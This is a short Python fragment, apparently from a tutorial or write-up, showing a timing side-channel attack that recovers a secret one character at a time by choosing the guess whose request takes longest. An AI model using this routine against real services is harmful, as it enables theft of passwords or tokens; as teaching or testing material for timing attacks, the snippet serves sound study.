       # Extract secret character by character

       import string

       known = ""
       charset = string.ascii_lowercase + string.digits

       while True:
           best_time = 0
           best_char = None

           for c in charset:
               test = known + c + 'X' * (target_length - len(known) - 1)
               elapsed = time_request(test)

               if elapsed > best_time:
                   best_time = elapsed
                   best_char = c

           known += best_char
           print(f"Current: {known}")

           if len(known) >= target_length:
               break

       print(f"Secret: {known}")
